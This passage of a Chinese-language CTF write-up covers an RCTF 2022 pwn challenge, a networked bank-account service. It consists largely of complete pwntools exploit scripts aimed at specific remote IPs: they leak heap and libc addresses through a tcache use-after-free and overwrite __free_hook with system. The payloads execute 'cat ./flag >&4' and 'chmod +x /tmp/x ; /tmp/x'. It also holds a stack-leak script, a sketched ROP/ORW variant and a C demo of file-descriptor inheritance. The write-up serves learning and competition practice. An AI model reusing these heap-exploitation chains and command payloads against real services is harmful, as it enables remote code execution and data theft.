b\"\"\n    data1 += b\"exit_account\".ljust(16,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    # return io.recv(timeout=1)    \n\ndef login(password,account_id):\n    data1 = b\"\"\n    data1 += b\"login\".ljust(16,b\"\\x00\")\n    data1 += password.ljust(8,b\"\\x00\")\n    data1 += account_id.ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    return io.recv()    \n\ndef cancellation(password):\n    data1 = b\"\"\n    data1 += b\"cancellation\".ljust(16,b\"\\x00\")\n    data1 += password.ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    return io.recv()       \n\ndef update_pwd(new_passwd,old_passwd):\n    data1 = b\"\"\n    data1 += b\"update_pwd\".ljust(16,b\"\\x00\")\n    data1 += new_passwd.ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    io.recv()\n    data2 = b\"\"\n    data2 += b\"update_pwd\".ljust(16,b\"\\x00\")\n    data2 += old_passwd.ljust(8,b\"\\x00\")\n    data2 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data2 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data2)\n    return io.recv() \n\nuuid_str = init_func()\nprint(uuid_str)\n\nnew_account(b\"1\"*8,b\"a\"*8,1000)\nexit_account()\nnew_account(b\"2\"*8,b\"b\"*8,1000)\nexit_account()\nnew_account(b\"3\"*8,b\"c\"*8,1000)\nexit_account()\nnew_account(b\"4\"*8,b\"d\"*8,1000)\nexit_account()\n\nlogin(b\"3\"*8,b\"c\"*8)\ncancellation(b\"3\"*8)\nlogin(b\"2\"*8,b\"b\"*8)\ncancellation(b\"2\"*8)\nlogin(b\"1\"*8,b\"a\"*8)\nleak_info = query()\nexit_account()\nheap_addr3 = leak_info[0x44:0x4c]\ntcache_flag = leak_info[0x4c:0x54]\nprint(b\"heap_addr3 = \", hex(u64(heap_addr3)))\nprint(b\"tcache_flag = \", hex(u64(tcache_flag)))\n\nio.interactive()\n```\n\n## 利用unsorted bin泄露libc\n\ntcache的管理结构在堆头位置，将对应位置成`0xf`，下次free该大小堆块时将进入fastbin（0x20~0x80）或unsorted bin。第一个进入unsorted bin的堆块，其fd和bk都将存放main_arena中top结构体的地址。再利用UAF就能获得libc地址。\n\n```python\nimport random\nimport ctypes\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\n# io = remote(\"127.0.0.1\",4445)\n# io = remote(\"190.92.237.200\",4445)\nio = remote(\"139.9.242.36\",4445)\n\ndef init_func():\n    sd = u32(io.recv(4))\n    print(\"seed value: \",hex(sd))\n    clibrary = ctypes.CDLL(\"./libtest.so\")\n    uuid_str = ctypes.c_char_p(b\"yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy\")\n    print(\"before: \",uuid_str.value)\n    clibrary.creatuuid(uuid_str,sd)\n    print(\"after: \",uuid_str.value)\n    sendvalue = uuid_str.value\n    io.send(uuid_str.value)\n    io.recv()\n    return uuid_str.value\n\ndef new_account(password,account_id,money):\n    data1 = b\"\"\n    data1 += b\"new_account\".ljust(16,b\"\\x00\")\n    data1 += password.ljust(8,b\"\\x00\")\n    data1 += account_id.ljust(32,b\"\\x00\")\n    data1 += p32(money)\n    io.sendline(data1)\n    return io.recv()\n\ndef query():\n    data1 = b\"\"\n    data1 += b\"query\".ljust(16,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    return io.recv()\n\ndef exit_account():\n    data1 = b\"\"\n    data1 += b\"exit_account\".ljust(16,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    # return io.recv(timeout=1)    \n\ndef login(password,account_id):\n    data1 = b\"\"\n    data1 += b\"login\".ljust(16,b\"\\x00\")\n    data1 += password.ljust(8,b\"\\x00\")\n    data1 += account_id.ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    return io.recv()    \n\ndef cancellation(password):\n    data1 = b\"\"\n    data1 += b\"cancellation\".ljust(16,b\"\\x00\")\n    data1 += password.ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    return io.recv()       \n\ndef update_pwd(new_passwd,old_passwd):\n    data1 = b\"\"\n    data1 += b\"update_pwd\".ljust(16,b\"\\x00\")\n    data1 += new_passwd.ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    io.recv()\n    data2 = b\"\"\n    data2 += b\"update_pwd\".ljust(16,b\"\\x00\")\n    data2 += old_passwd.ljust(8,b\"\\x00\")\n    data2 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data2 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data2)\n    return io.recv() \n\nuuid_str = init_func()\nprint(uuid_str)\n\nnew_account(b\"1\"*8,b\"a\"*8,1000)\nexit_account()\nnew_account(b\"2\"*8,b\"b\"*8,1000)\nexit_account()\nnew_account(b\"3\"*8,b\"c\"*8,1000)\nexit_account()\nnew_account(b\"4\"*8,b\"d\"*8,1000)\nexit_account()\nnew_account(b\"5\"*8,b\"e\"*8,1000)\nexit_account()\nnew_account(b\"6\"*8,b\"f\"*8,1000)\nexit_account()\nnew_account(b\"7\"*8,b\"g\"*8,1000)\nexit_account()\nnew_account(b\"8\"*8,b\"h\"*8,1000)\nexit_account()\n\n# local \n# heap3_addr = 0x55a284a162f0\n# tcache_flag = 0x55a284a15010\n\n# remote\nheap3_addr = 0x55f6e10b56f0\ntcache_flag = 0x55f6e10b5010\n\nheap2_size_addr = heap3_addr - 0x48\nheap9_addr = heap3_addr + 0x40*6\nheap8_addr = heap3_addr + 0x40*5\nheap7_addr = heap3_addr + 0x40*4\npatch_tcache = tcache_flag + 0x8\n\n######## write 2nd heap's size to 0x101\nlogin(b\"8\"*8,b\"h\"*8)\ncancellation(b\"8\"*8) \n\nlogin(b\"7\"*8,b\"g\"*8)\ncancellation(b\"7\"*8)                    # heap7 in tcache\n\nlogin(p64(heap8_addr),p64(tcache_flag))\nupdate_pwd(p64(heap2_size_addr),p64(heap8_addr))          # heap7 in tcache [heap2_size_addr,tcache_flag]\nexit_account()\n\nnew_account(b\"7\"*8,b\"7h\"*4,1000)             # bss9 <- heap7\nexit_account()\n\nnew_account(p32(0x101),b\"x\"*32,1000)        # write complete , in bss7\nexit_account()\n\n######## write tcache manage block, make 0x101 chain full\nlogin(b\"7\"*8,b\"7h\"*4)\ncancellation(b\"7\"*8)\n\nlogin(b\"6\"*8,b\"f\"*8)\ncancellation(b\"6\"*8)        # heap6 in tcache\n\nlogin(p64(heap7_addr),p64(tcache_flag))           # heap6 in tcache []\nupdate_pwd(p64(patch_tcache),p64(heap7_addr))\nexit_account()\n\nnew_account(b\"6\"*8,b\"6f\"*4,1000)\nexit_account()\n\nnew_account(p64(0xffffffffffffffff),p64(0xffffffffffffffff),1000)\nexit_account()\n\n######## leak libc\nlogin(b\"x\"*8,b\"x\"*24+p64(0x1000003e8))          #login heap2,and free. to unsorted bin\ncancellation(b\"x\"*8)\n\nlogin(b\"1\"*8,b\"a\"*8)                    #login heap1,and leak libc\nrecv_info = query()\nlibc_addr = u64(recv_info[0x44:0x4c])\nlibc_base = libc_addr - 0x3ebca0\nprint(\"[+]: \",hex(libc_base))\nio.interactive()\n```\n\n## 利用任意地址写改函数指针，执行cat ./flag >&4\n\n改 `__free_hook` 地址处的值为`system`地址，将命令放入某个堆块中，free该堆块时，就能执行命令。这里利用本题socket的特性，复用fd4，可以通过cat将flag重定向到socket连接中，client端收到flag。\n\n![image-20221214211717041](image-20221214211717041.png?size=600)\n\n```python\n\nimport random\nimport ctypes\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\n# io = remote(\"127.0.0.1\",4445)\n# io = remote(\"190.92.237.200\",4444)\nio = remote(\"139.9.242.36\",4445)\n\ndef init_func():\n    sd = u32(io.recv(4))\n    print(\"seed value: \",hex(sd))\n    clibrary = ctypes.CDLL(\"./libtest.so\")\n    uuid_str = ctypes.c_char_p(b\"yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy\")\n    print(\"before: \",uuid_str.value)\n    clibrary.creatuuid(uuid_str,sd)\n    print(\"after: \",uuid_str.value)\n    sendvalue = uuid_str.value\n    io.send(uuid_str.value)\n    io.recv()\n    return uuid_str.value\n\ndef new_account_2(password,account_id,money):\n    data1 = b\"\"\n    data1 += b\"new_account\".ljust(16,b\"\\x00\")\n    data1 += password.ljust(8,b\"\\x00\")\n    data1 += account_id.ljust(32,b\"\\x00\")\n    data1 += money.ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    return io.recv()\n\ndef query():\n    data1 = b\"\"\n    data1 += b\"query\".ljust(16,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    return io.recv()\n\ndef exit_account():\n    data1 = b\"\"\n    data1 += b\"exit_account\".ljust(16,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    # return io.recv(timeout=1)    \n\ndef login(password,account_id):\n    data1 = b\"\"\n    data1 += b\"login\".ljust(16,b\"\\x00\")\n    data1 += password.ljust(8,b\"\\x00\")\n    data1 += account_id.ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    return io.recv()    \n\ndef cancellation(password):\n    data1 = b\"\"\n    data1 += b\"cancellation\".ljust(16,b\"\\x00\")\n    data1 += password.ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    return io.recv()       \n\ndef update_pwd(new_passwd,old_passwd):\n    data1 = b\"\"\n    data1 += b\"update_pwd\".ljust(16,b\"\\x00\")\n    data1 += new_passwd.ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    io.recv()\n    data2 = b\"\"\n    data2 += b\"update_pwd\".ljust(16,b\"\\x00\")\n    data2 += old_passwd.ljust(8,b\"\\x00\")\n    data2 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data2 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data2)\n    return io.recv() \n\nuuid_str = init_func()\nprint(uuid_str)\n\n# local\n# heap3_addr = 0x55c008d3e2f0\n# tcache_flag = 0x55c008d3d010\n# libc_base = 0x7f61e853e000\n# remote\nheap3_addr = 0x55f6e10b56f0\ntcache_flag = 0x55f6e10b5010\nlibc_base = 0x7fb05441f000\n\nheap1_addr = heap3_addr - 0x40*2\nheap2_addr = heap3_addr - 0x40\nheap4_addr = heap3_addr + 0x40\nheap5_addr = heap3_addr + 0x40*2\n\ntarget_addr2 = libc_base + 0x3ed8e8     # __free_hook\ntarget_data2 = p64(libc_base + 0x4f420).ljust(0x2c,b\"\\x00\")             # system\n\ncmd = b'chmod +x /tmp/x ; /tmp/x'.ljust(0x2c,b\"\\x00\")\n\nnew_account_2(cmd[0:8],cmd[8:40],cmd[40:44])\nexit_account()\nnew_account_2(b\"2\"*8,b\"b\"*9,p32(1000))\nexit_account()\nnew_account_2(b\"3\"*8,b\"c\"*9,p32(1000))\nexit_account()\nnew_account_2(b\"4\"*8,b\"d\"*9,p32(1000))\nexit_account()\nnew_account_2(b\"5\"*8,b\"e\"*9,p32(1000))\nexit_account()\n\n########\nlogin(b\"2\"*8,b\"b\"*9)\ncancellation(b\"2\"*8)\nlogin(b\"3\"*8,b\"c\"*9)\ncancellation(b\"3\"*8)\n\nlogin(p64(heap2_addr),p64(tcache_flag)+b\"c\")\nupdate_pwd(p64(target_addr2),p64(heap2_addr))             # target addr\nexit_account()\n\nnew_account_2(b\"3\"*8,b\"c\"*9,p32(1000))\nexit_account()\n\nnew_account_2(target_data2[0:8],target_data2[8:40],target_data2[40:44])     # target data\nexit_account()\n\nlogin(cmd[0:8],cmd[8:40])\ncancellation(cmd[0:8])\n\nio.interactive()\n```\n\n## 完整利用代码\n\n```python\nimport random\nimport ctypes\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\n# ip = \"127.0.0.1\"\nip = \"139.9.242.36\"\nport = 4445\n\nio = None\n\ndef init_func():\n    sd = u32(io.recv(4))\n    print(\"seed value: \",hex(sd))\n    clibrary = ctypes.CDLL(\"./libtest.so\")\n    uuid_str = ctypes.create_string_buffer(b\"yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy\")\n    print(\"before: \",uuid_str.value)\n    clibrary.creatuuid(uuid_str,sd)\n    print(\"after: \",uuid_str.value)\n    io.send(uuid_str.value)\n    io.recv()\n\ndef new_account(password,account_id,money):\n    data1 = b\"\"\n    data1 += b\"new_account\".ljust(16,b\"\\x00\")\n    data1 += password.ljust(8,b\"\\x00\")\n    data1 += account_id.ljust(32,b\"\\x00\")\n    data1 += p32(money)\n    io.sendline(data1)\n    return io.recv()\n\ndef new_account_2(password,account_id,money):\n    data1 = b\"\"\n    data1 += b\"new_account\".ljust(16,b\"\\x00\")\n    data1 += password.ljust(8,b\"\\x00\")\n    data1 += account_id.ljust(32,b\"\\x00\")\n    data1 += money.ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    return io.recv()\n\ndef query():\n    data1 = b\"\"\n    data1 += b\"query\".ljust(16,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    return io.recv()\n\ndef exit_account():\n    data1 = b\"\"\n    data1 += b\"exit_account\".ljust(16,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    # return io.recv(timeout=1)    \n\ndef login(password,account_id):\n    data1 = b\"\"\n    data1 += b\"login\".ljust(16,b\"\\x00\")\n    data1 += password.ljust(8,b\"\\x00\")\n    data1 += account_id.ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    return io.recv()    \n\ndef cancellation(password):\n    data1 = b\"\"\n    data1 += b\"cancellation\".ljust(16,b\"\\x00\")\n    data1 += password.ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    return io.recv()       \n\ndef update_pwd(new_passwd,old_passwd):\n    data1 = b\"\"\n    data1 += b\"update_pwd\".ljust(16,b\"\\x00\")\n    data1 += new_passwd.ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    io.recv()\n    data2 = b\"\"\n    data2 += b\"update_pwd\".ljust(16,b\"\\x00\")\n    data2 += old_passwd.ljust(8,b\"\\x00\")\n    data2 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data2 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data2)\n    return io.recv() \n\ndef leak_heap():\n    global io \n    io = remote(ip,port)\n    init_func()\n\n    new_account(b\"1\"*8,b\"a\"*8,1000)\n    exit_account()\n    new_account(b\"2\"*8,b\"b\"*8,1000)\n    exit_account()\n    new_account(b\"3\"*8,b\"c\"*8,1000)\n    exit_account()\n    new_account(b\"4\"*8,b\"d\"*8,1000)\n    exit_account()\n\n    login(b\"3\"*8,b\"c\"*8)\n    cancellation(b\"3\"*8)\n    login(b\"2\"*8,b\"b\"*8)\n    cancellation(b\"2\"*8)\n    login(b\"1\"*8,b\"a\"*8)\n    leak_info = query()\n    exit_account()\n    heap3_addr = u64(leak_info[0x44:0x4c])\n    tcache_flag = u64(leak_info[0x4c:0x54])\n    io.close()\n    return heap3_addr,tcache_flag\n\nheap3_addr,tcache_flag = leak_heap()\n\ndef leak_libc():\n    global io\n    io = remote(ip,port)\n    init_func()\n\n    new_account(b\"1\"*8,b\"a\"*8,1000)\n    exit_account()\n    new_account(b\"2\"*8,b\"b\"*8,1000)\n    exit_account()\n    new_account(b\"3\"*8,b\"c\"*8,1000)\n    exit_account()\n    new_account(b\"4\"*8,b\"d\"*8,1000)\n    exit_account()\n    new_account(b\"5\"*8,b\"e\"*8,1000)\n    exit_account()\n    new_account(b\"6\"*8,b\"f\"*8,1000)\n    exit_account()\n    new_account(b\"7\"*8,b\"g\"*8,1000)\n    exit_account()\n    new_account(b\"8\"*8,b\"h\"*8,1000)\n    exit_account()\n\n    heap2_size_addr = heap3_addr - 0x48\n    heap9_addr = heap3_addr + 0x40*6\n    heap8_addr = heap3_addr + 0x40*5\n    heap7_addr = heap3_addr + 0x40*4\n    patch_tcache = tcache_flag + 0x8\n\n    ########\n    login(b\"8\"*8,b\"h\"*8)\n    cancellation(b\"8\"*8) \n\n    login(b\"7\"*8,b\"g\"*8)\n    cancellation(b\"7\"*8)                    # heap7 in tcache\n\n    login(p64(heap8_addr),p64(tcache_flag))\n    update_pwd(p64(heap2_size_addr),p64(heap8_addr))          # heap7 in tcache [heap2_size_addr,tcache_flag]\n    exit_account()\n\n    new_account(b\"7\"*8,b\"7h\"*4,1000)             # bss9 <- heap7\n    exit_account()\n\n    new_account(p32(0x101),b\"x\"*32,1000)        # write complete , in bss7\n    exit_account()\n\n    ########\n    login(b\"7\"*8,b\"7h\"*4)\n    cancellation(b\"7\"*8)\n\n    login(b\"6\"*8,b\"f\"*8)\n    cancellation(b\"6\"*8)        # heap6 in tcache\n\n    login(p64(heap7_addr),p64(tcache_flag))           # heap6 in tcache []\n    update_pwd(p64(patch_tcache),p64(heap7_addr))\n    exit_account()\n\n    new_account(b\"6\"*8,b\"6f\"*4,1000)\n    exit_account()\n\n    new_account(p64(0xffffffffffffffff),p64(0xffffffffffffffff),1000)\n    exit_account()\n\n    login(b\"x\"*8,b\"x\"*24+p64(0x1000003e8))              #login heap2,and free\n    cancellation(b\"x\"*8)\n\n    login(b\"1\"*8,b\"a\"*8)                                #login heap1,and leak libc\n    recv_info = query()\n    libc_addr = u64(recv_info[0x44:0x4c])\n    libc_base = libc_addr - 0x3ebca0\n    io.close()\n    return libc_base\n\nsleep(1)  \nlibc_base = leak_libc()\n\nprint(b\"[+] heap3_addr = \", hex(heap3_addr))\nprint(b\"[+] tcache_flag = \", hex(tcache_flag))\nprint(b\"[+] libc base : \",hex(libc_base))\n\n\ndef get_flag():\n    global io\n    io = remote(ip,port)\n    init_func()\n\n    heap1_addr = heap3_addr - 0x40*2\n    heap2_addr = heap3_addr - 0x40\n    heap4_addr = heap3_addr + 0x40\n    heap5_addr = heap3_addr + 0x40*2\n\n\n    target_addr2 = libc_base + 0x3ed8e8     # __free_hook\n\n    target_data2 = p64(libc_base + 0x4f420).ljust(0x2c,b\"\\x00\")\n\n    cmd = b'cat ./flag >&4'.ljust(0x2c,b\"\\x00\")\n\n    new_account_2(cmd[0:8],cmd[8:40],cmd[40:44])\n    exit_account()\n    new_account_2(b\"2\"*8,b\"b\"*9,p32(1000))\n    exit_account()\n    new_account_2(b\"3\"*8,b\"c\"*9,p32(1000))\n    exit_account()\n    new_account_2(b\"4\"*8,b\"d\"*9,p32(1000))\n    exit_account()\n    new_account_2(b\"5\"*8,b\"e\"*9,p32(1000))\n    exit_account()\n\n\n    ########\n    login(b\"2\"*8,b\"b\"*9)\n    cancellation(b\"2\"*8)\n    login(b\"3\"*8,b\"c\"*9)\n    cancellation(b\"3\"*8)\n\n    login(p64(heap2_addr),p64(tcache_flag)+b\"c\")\n    update_pwd(p64(target_addr2),p64(heap2_addr))             # target addr\n    exit_account()\n\n    new_account_2(b\"3\"*8,b\"c\"*9,p32(1000))\n    exit_account()\n\n    new_account_2(target_data2[0:8],target_data2[8:40],target_data2[40:44])     # target data\n    exit_account()\n\n    login(cmd[0:8],cmd[8:40])\n    cancellation(cmd[0:8])\n\n    io.interactive()\n\nget_flag()\n```\n\n\n\n![image-20221213230746324](image-20221213230746324.png?size=600)\n\n\n\n# review\n\n## 未发现的漏洞点\n\n> 在`stat_query`分支有一个栈信息泄露，比赛的时候未注意到\n\n利用栈信息泄露，可以轻松获得程序基址及libc基址，以及一个栈地址。然后利用[fastbin_reverse_into_tcache](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/fastbin_reverse_into_tcache.c)，达到任意地址写。将`__free_hook`处改成`system`的地址，再次free时控制流劫持。\n\n利用`stat_query`泄露信息的代码如下，完整利用代码可参考wp：[RCTF 2022 WriteUp By F61d -  公众号笨猪实验室](https://mp.weixin.qq.com/s?__biz=Mzg2NDgyNTAzMw==&mid=2247484295&idx=1&sn=04de896450a9f699bd1eba6f072bb7e0&chksm=ce623821f915b13717ded67f8c67acf70ceefa2472c86dd061dfc6ab0e67f0f9b8be49533e7d&mpshare=1&scene=1&srcid=1213L8zDI74qa55R2BabNH32&sharer_sharetime=1670910479063&sharer_shareid=e67c8ecafd8e2062827a618a29fc4dae#rd)\n\n```python\nimport random\nimport ctypes\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\n# io = remote(\"127.0.0.1\",4445)\n# io = remote(\"190.92.237.200\",4445)\nio = remote(\"139.9.242.36\",4445)\n\ndef init_func():\n    sd = u32(io.recv(4))\n    print(\"seed value: \",hex(sd))\n    clibrary = ctypes.CDLL(\"./libtest.so\")\n    uuid_str = ctypes.c_char_p(b\"yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy\")\n    print(\"before: \",uuid_str.value)\n    clibrary.creatuuid(uuid_str,sd)\n    print(\"after: \",uuid_str.value)\n    sendvalue = uuid_str.value\n    io.send(uuid_str.value)\n    io.recv()\n    return uuid_str.value\n\ndef stat_query():\n    data1 = b\"\"\n    data1 += b\"stat_query\".ljust(16,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    return io.recv()\n\n\nuuid_str = init_func()\n\nrecv_str = stat_query()\n\nprog_base = u64(recv_str[0x14:0x1c]) - 0x2130\nlibc_base = u64(recv_str[0x1c:0x24]) - 0x21c87\nstack = u64(recv_str[0x2c:0x34])\n\nprint(\"prog base:\",hex(prog_base))\nprint(\"libc base:\",hex(libc_base))\nprint(\"stack:\",hex(stack))\n\nio.interactive()\n```\n\n## 另一种方式ROP+ORW\n\n参考WP：[RCTF WriteUp By Nu1L.pdf](RCTF WriteUp By Nu1L.pdf)\n\n进`exit_system`分支退出时，不会关闭socket连接，按流程返回`libc_start_main`。而返回地址存在栈上，如下图`0x007ffd4171c988`处。利用UAF构造的任意地址写，可以在此处ROP，先实现一个`read(4,0x007ffd4171c988,300)`，从client读入更多利用代码写入栈空间，并覆盖read函数的返回地址，当read函数返回时，再次控制流劫持。这次控制流劫持就去完成ORW，并将读取的flag内容通过fd4发送给client端。\n\n![image-20221214224605022](image-20221214224605022.png?size=600)\n\n# 其他\n\n\n## 子进程继承父进程所有fd\n\n> 当父进程创建子进程时，子进程会自动继承父进程所有的fd描述符\n\n以一个多进程tcp服务器为例，在客户端连接后，查看主进程及其子进程的fd关系。\n\n参考 [C语言网络编程-tcp服务器实现](https://cloud.tencent.com/developer/article/1556491) 中“多进程TCP服务器”的实现代码，在子处理进程中新增一条`system`命令，模拟pwn中控制流劫持后执行`system`时子子进程的情况。\n\n```c\n// server.c\n// gcc server.c -o server\n#include <stdio.h>\n#include <arpa/inet.h>//inet_addr() sockaddr_in\n#include <string.h>//bzero()\n#include <sys/socket.h>//socket\n#include <unistd.h>\n#include <stdlib.h>//exit()\n#include<sys/wait.h>//waitpid();\n\n#define BUFFER_SIZE 1024\n\nint main() {\n    char listen_addr_str[] = \"0.0.0.0\";\n    size_t listen_addr = inet_addr(listen_addr_str);\n    int port = 7777;\n    int server_socket, client_socket;\n    struct sockaddr_in server_addr, client_addr;\n    socklen_t addr_size;\n    char buffer[BUFFER_SIZE];//缓冲区大小\n\n    int str_length;\n    pid_t pid;\n    int status = 0;//初始化状态\n\n    server_socket = socket(PF_INET, SOCK_STREAM, 0);//创建套接字\n    bzero(&server_addr, sizeof(server_addr));//初始化\n    server_addr.sin_family = INADDR_ANY;\n    server_addr.sin_port = htons(port);\n    server_addr.sin_addr.s_addr = listen_addr;\n\n    if (bind(server_socket, (struct sockaddr *) &server_addr, sizeof(server_addr)) == -1) {\n        printf(\"绑定失败\\n\");\n        exit(1);\n    }\n    if (listen(server_socket, 5) == -1) {\n        printf(\"监听失败\\n\");\n        exit(1);\n    }\n\n    printf(\"创建tcp服务器成功\\n\");\n\n    while (1) {\n        addr_size = sizeof(client_addr);\n        client_socket = accept(server_socket, (struct sockaddr *) &client_addr, &addr_size);\n        printf(\"%d 连接成功\\n\", client_socket);\n        printf(\"[+] %d is socket() return fd\\n\",server_socket);\n\n        char msg[] = \"恭喜你连接成功\";\n        write(client_socket, msg, sizeof(msg));\n\n        pid = fork();\n        if (pid > 0) {\n            sleep(1);//父进程,进行下次循环,读取客户端连接事件\n            waitpid(-1, &status, WNOHANG | WUNTRACED | WCONTINUED);\n\n            if (WIFEXITED(status)) {\n                printf(\"status = %d\\n\", WEXITSTATUS(status));\n            }\n            if (WIFSIGNALED(status)) { //如果子进程是被信号结束了 ，则为真\n                printf(\"signal status = %d\\n\", WTERMSIG(status));       //R->T\n            }\n            if (WIFSTOPPED(status)) {\n                printf(\"stop sig num = %d\\n\", WSTOPSIG(status));\n            }                                                           //T->R\n            if (WIFCONTINUED(status)) {\n                printf(\"continue......\\n\");\n            }\n        } else if (pid == 0) {//子进程,进行阻塞式收发客户端数据\n\n            system(\"echo '[+] i am in system';sleep 1000\");\n\n            while (1) {\n                memset(buffer, 0, sizeof(buffer));\n                str_length = read(client_socket, buffer, BUFFER_SIZE);\n                if (str_length == 0)    //读取数据完毕关闭套接字\n                {\n                    close(client_socket);\n                    printf(\"连接已经关闭: %d \\n\", client_socket);\n                    exit(1);\n                } else {\n                    printf(\"%d 客户端发送数据:%s \\n\", client_socket, buffer);\n                    write(client_socket, buffer, str_length);//发送数据\n                }\n            }\n            break;\n        } else {\n            printf(\"创建子进程失败\\n\");\n            exit(1);\n        }\n    }\n    return 0;\n}\n```\n\n1、编译上述代码，生成server程序，运行该程序，它将监听本地的`7777`端口。\n\n2、构造客户端连接服务端，然后查看server主进程、server子进程、以及system的\"sh -c\"这三个进程的/proc/pid/fd目录下文件描述符个数。可以看到，父子进程的文件描述符都是相同的。\n\n```bash\n$ ls -al /proc/891251/fd\t\t\t\t\t\t\t\t# server主进程\ntotal 0\ndr-x------ 2 bling bling  0 12月 13 22:30 .\ndr-xr-xr-x 9 bling bling  0 12月 13 22:29 ..\nlrwx------ 1 bling bling 64 12月 13 22:30 0 -> /dev/pts/3\nlrwx------ 1 bling bling 64 12月 13 22:30 1 -> /dev/pts/3\nlrwx------ 1 bling bling 64 12月 13 22:30 2 -> /dev/pts/3\nlrwx------ 1 bling bling 64 12月 13 22:30 3 -> 'socket:[328782]'\nlrwx------ 1 bling bling 64 12月 13 22:30 4 -> 'socket:[328783]'\n$ ls -al /proc/891271/fd\t\t\t\t\t\t\t\t# server子进程\ntotal 0\ndr-x------ 2 bling bling  0 12月 13 22:30 .\ndr-xr-xr-x 9 bling bling  0 12月 13 22:30 ..\nlrwx------ 1 bling bling 64 12月 13 22:30 0 -> /dev/pts/3\nlrwx------ 1 bling bling 64 12月 13 22:30 1 -> /dev/pts/3\nlrwx------ 1 bling bling 64 12月 13 22:30 2 -> /dev/pts/3\nlrwx------ 1 bling bling 64 12月 13 22:30 3 -> 'socket:[328782]'\nlrwx------ 1 bling bling 64 12月 13 22:30 4 -> 'socket:[328783]'\t\n$ ls -al /proc/891272/fd\t\t\t\t\t\t\t\t# \"sh -c\"进程\ntotal 0\ndr-x------ 2 bling bling  0 12月 13 22:32 .\ndr-xr-xr-x 9 bling bling  0 12月 13 22:30 ..\nlrwx------ 1 bling bling 64 12月 13 22:32 0 -> /dev/pts/3\nlrwx------ 1 bling bling 64 12月 13 22:32 1 -> /dev/pts/3\nlrwx------ 1 bling bling 64 12月 13 22:32 2 -> /dev/pts/3\nlrwx------ 1 bling bling 